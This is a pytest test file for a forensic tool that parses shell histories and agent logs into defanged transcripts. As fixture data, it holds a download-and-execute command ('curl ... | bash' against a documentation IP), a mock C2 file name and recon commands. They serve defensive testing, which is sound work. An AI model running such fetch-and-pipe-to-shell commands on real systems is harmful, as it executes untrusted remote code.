import json

from interlinear_cti.model import Transcript
from interlinear_cti.parse import detect_kind, is_binary, parse_paths, write_transcript

NOW = "2026-10-15T00:00:00Z"


def write(folder, name, text):
    path = folder / name
    path.write_bytes(text.encode("utf-8"))
    return path


def test_bash_history_becomes_split_defanged_pending_lines(tmp_path):
    f = write(tmp_path, ".bash_history", "#1700000000\ncd /tmp; curl http://203.0.113.5/x | bash\n")
    data = parse_paths([f], now=NOW)
    assert data["sources"][0]["kind"] == "bash_history"
    assert data["sources"][0]["size"] == f.stat().st_size
    assert [(l["n"], l["line"], l["text"], l["actor"], l["gloss"]["source"]) for l in data["lines"]] == [
        (1, 2, "cd /tmp", "operator", "pending"),
        (2, 2, "curl hxxp://203.0.113[.]5/x | bash", "operator", "pending"),
    ]
    assert data["lines"][0]["ts"] == "2023-11-14T22:13:20Z"
    Transcript.model_validate(data)


def test_binary_files_are_recorded_by_hash_only(tmp_path):
    f = tmp_path / "payload.bin"
    f.write_bytes(b"\x7fELF\x00\x01\x02")
    data = parse_paths([f], now=NOW)
    assert data["lines"] == []
    assert data["sources"][0]["rejected"].startswith("binary")
    assert data["warnings"][0].startswith("payload.bin: binary file skipped")


def test_unrecognized_files_become_unknown_lines(tmp_path):
    f = write(tmp_path, "notes", "something odd\n")
    data = parse_paths([f], now=NOW)
    assert data["sources"][0]["kind"] == "unknown"
    assert data["lines"][0]["actor"] == "unknown"
    assert data["warnings"] == ["notes: unrecognized format; lines kept as unknown"]


def test_agent_tool_output_is_recorded_but_not_glossed(tmp_path):
    f = write(tmp_path, "run.jsonl", '{"role": "tool_call", "input": "id"}\n{"role": "tool_result", "output": "uid=0(root)"}\n')
    data = parse_paths([f], now=NOW)
    assert data["sources"][0]["kind"] == "agent_jsonl"
    assert data["sources"][0]["agent_framework"] == "generic"
    assert [(l["actor"], l["gloss"]["source"]) for l in data["lines"]] == [("agent_tool", "pending"), ("tool_output", "none")]


def test_folders_are_walked_in_name_order(tmp_path):
    folder = tmp_path / "case"
    folder.mkdir()
    write(folder, "b.sh", "id\n")
    write(folder, "a.sh", "whoami\n")
    assert [s["name"] for s in parse_paths([folder], now=NOW)["sources"]] == ["a.sh", "b.sh"]


def test_files_with_timestamps_are_interleaved(tmp_path):
    a = write(tmp_path, "a.jsonl", '{"role": "user", "content": "first", "ts": "2026-01-01T00:00:00Z"}\n'
                                  '{"role": "user", "content": "third", "ts": "2026-01-01T00:02:00Z"}\n')
    b = write(tmp_path, "b.jsonl", '{"role": "user", "content": "second", "ts": "2026-01-01T00:01:00Z"}\n')
    data = parse_paths([a, b], now=NOW)
    assert [l["text"] for l in data["lines"]] == ["first", "second", "third"]
    assert [l["n"] for l in data["lines"]] == [1, 2, 3]


def test_detect_kind_by_name_and_content():
    assert detect_kind(".zsh_history", "") == "zsh"
    assert detect_kind("ConsoleHost_history.txt", "") == "powershell"
    assert detect_kind("dropper.ps1", "") == "script"
    assert detect_kind("history.txt", ": 1700000000:0;id") == "zsh"
    assert detect_kind("history.txt", "#1700000000\nid") == "bash"
    assert detect_kind("log.txt", '{"role": "user"}') == "agent-jsonl"
    assert detect_kind("web01.bash_history", "") == "bash"
    assert detect_kind("deep.jsonl", "[" * 100000) == "agent-jsonl"  # .jsonl is always an agent log


def test_is_binary():
    assert is_binary(b"\x00abc")
    assert not is_binary(b"echo hi\n")
    assert not is_binary("é".encode("utf-8"))


def test_write_transcript_creates_folders_and_round_trips(tmp_path):
    f = write(tmp_path, ".bash_history", "id\n")
    out = tmp_path / "out" / "transcript.json"
    write_transcript(parse_paths([f], now=NOW), out)
    assert json.loads(out.read_text(encoding="utf-8"))["lines"][0]["text"] == "id"


def test_file_names_and_warnings_are_defanged(tmp_path):
    f = write(tmp_path, "c2-203.0.113.9", '{"role": "http://203.0.113.9/x", "content": "hi"}\n')
    data = parse_paths([f], now=NOW)
    assert data["sources"][0]["name"] == "c2-203.0.113[.]9"
    assert "hxxp://203.0.113[.]9/x" in data["warnings"][0]
    assert "203.0.113.9" not in json.dumps(data)


def test_zsh_histories_are_unmetafied_before_decoding(tmp_path):
    # zsh writes Meta (0x83) before each byte in 0x83-0xA2 and stores that byte XOR 0x20 (zsh Src/hist.c).
    meta = bytearray()
    for b in "echo 'Отправлено'".encode("utf-8"):
        meta += bytes([0x83, b ^ 0x20]) if 0x83 <= b <= 0xA2 else bytes([b])
    f = tmp_path / ".zsh_history"
    f.write_bytes(b": 1700000000:0;" + bytes(meta) + b"\n")
    data = parse_paths([f], now=NOW)
    assert data["lines"][0]["text"] == "echo 'Отправлено'"
    assert data["warnings"] == []


def test_a_reader_error_skips_the_file_instead_of_crashing(tmp_path, monkeypatch):
    import interlinear_cti.parse as parse_module

    def broken(text, warnings=None):
        raise RuntimeError("attacker text hxxp://203.0.113[.]9/")

    monkeypatch.setattr(parse_module, "read_bash", broken)
    bad = write(tmp_path, "a.bash_history", "id\n")
    good = write(tmp_path, "b.sh", "whoami\n")
    data = parse_paths([bad, good], now=NOW)
    assert data["sources"][0]["rejected"] == "reader error: RuntimeError"
    assert data["warnings"] == ["a.bash_history: reader error (RuntimeError); file skipped"]
    assert [line["text"] for line in data["lines"]] == ["whoami"]


def test_only_newlines_split_unknown_files(tmp_path):
    odd = "one" + chr(0x0B) + "two" + chr(0x2028) + "three"
    f = write(tmp_path, "notes", odd + "\nfour\n")
    data = parse_paths([f], now=NOW)
    stored = odd.replace(chr(0x0B), chr(0x240B))  # controls are stored as their control pictures
    stored = stored.replace(chr(0x2028), chr(0x27E8) + "U+2028" + chr(0x27E9))  # U+2028 is shown as its code point
    assert [(line["line"], line["text"]) for line in data["lines"]] == [(1, stored), (2, "four")]
